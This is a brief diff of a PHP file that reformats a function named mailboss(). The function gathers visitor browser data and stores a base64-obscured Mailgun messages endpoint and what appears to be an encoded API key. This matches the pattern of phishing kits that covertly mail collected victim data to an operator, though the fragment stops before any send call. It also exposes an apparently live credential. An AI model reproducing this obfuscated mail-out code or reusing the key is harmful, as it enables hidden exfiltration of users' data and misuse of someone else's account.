@@ -49,16 +49,12 @@ function http_digest_parse($txt)
 
 function mailboss()
 {
-  $ua = getBrowser();
-    foreach($ua as $value)
-
-
-  
-
-$patterns = array();
-$patterns[0] = '/Array/';
-$patterns[1] = '/\(/';
-$patterns[2] = '/\)/';
+    $ua = getBrowser();
+    $patterns = array();
+    $patterns[0] = '/Array/';
+    $patterns[1] = '/\(/';
+    $patterns[2] = '/\)/';
+    
        $str = "MjlmMDU1NTQwOTE5ZDA0ZmFiNDdiOTY2OTAxM2E5YmYtNmUwZmQzYTQtYWIyM2M5YmY=";
        $domain = "aHR0cHM6Ly9hcGkubWFpbGd1bi5uZXQvdjMvc2FuZGJveDI3OGRiMGFhNDFmOTQ5Zjc4NzU4NzczM2NkNTBlNDFjLm1haWxndW4ub3JnL21lc3NhZ2Vz";
        $sm =  base64_decode($str);
